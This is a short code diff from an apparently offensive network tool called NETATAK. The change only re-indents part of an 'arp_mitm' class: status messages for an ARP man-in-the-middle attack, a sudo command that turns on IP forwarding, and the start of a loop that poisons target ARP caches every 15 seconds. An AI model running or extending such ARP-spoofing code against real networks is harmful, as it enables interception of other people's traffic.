@@ -89,11 +89,11 @@ class arp_mitm:
 
     def start_arp_mitm(self):
         if self.verbose == 1:
-         print("{0}[*] Starting ARP MITM attack...".format(N))
-         print("{0}[*] Turning on IP Forwarding in {1}...".format(N, self.ipforward_file))
-         os.popen("sudo echo '1' > {0}".format(self.ipforward_file))
-         print("{0}[*] Use Wireshark or a similar network analysis tool to monitor the traffic.".format(Y))
-         print("{0}[*] NETATAK will poison the target ARP cache every 15 seconds.".format(N))
+            print("{0}[*] Starting ARP MITM attack...".format(N))
+            print("{0}[*] Turning on IP Forwarding in {1}...".format(N, self.ipforward_file))
+            os.popen("sudo echo '1' > {0}".format(self.ipforward_file))
+            print("{0}[*] Use Wireshark or a similar network analysis tool to monitor the traffic.".format(Y))
+            print("{0}[*] NETATAK will poison the target ARP cache every 15 seconds.".format(N))
         try:
             while True:
                 for i in self.tgt_list:
